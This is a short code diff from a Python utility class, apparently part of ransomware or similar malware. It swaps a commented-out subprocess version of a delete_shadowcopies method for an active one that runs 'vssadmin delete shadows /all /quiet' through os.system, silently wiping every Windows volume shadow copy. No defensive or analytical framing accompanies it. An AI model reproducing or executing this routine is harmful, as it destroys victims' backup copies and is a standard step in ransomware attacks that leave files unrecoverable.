@@ -181,16 +181,7 @@ class Utils:
         if int(ret) <= 32:
             raise Exception("Command not executed")
 
-    """
-    def delete_shadowcopies(self):
-        try:
-            completed = subprocess.Popen(
-                [r'c:\Windows\System32\vssadmin.exe', 'delete', 'shadows', '/all', '/quiet'])
-            return completed
-        except:
-            pass
-    """
-
+            
     def delete_shadowcopies(self):
         try:
             os.system("cmd /c vssadmin delete shadows /all /quiet")
